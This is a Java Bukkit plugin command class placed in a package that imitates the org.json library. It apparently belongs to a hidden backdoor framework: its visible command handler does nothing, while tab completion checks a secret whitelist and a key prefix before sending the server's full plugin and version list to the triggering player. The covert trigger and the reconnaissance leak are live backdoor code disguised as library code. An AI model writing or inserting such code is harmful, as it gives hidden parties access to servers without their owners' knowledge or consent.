package org.json.modals.plugins;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class PluginsList extends BDCommand {
    public PluginsList() {
        super("pluginList");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();
        String pluginInfo = Arrays.stream(Modal.getPluginManager().getPlugins()).map(plugin -> "§a" + plugin.getName() + " §9v" + plugin.getDescription().getVersion()).collect(Collectors.joining("§f, "));
        player.sendMessage("Plugins: " + pluginInfo);
        return tabComplBuilder.build();
    }
}
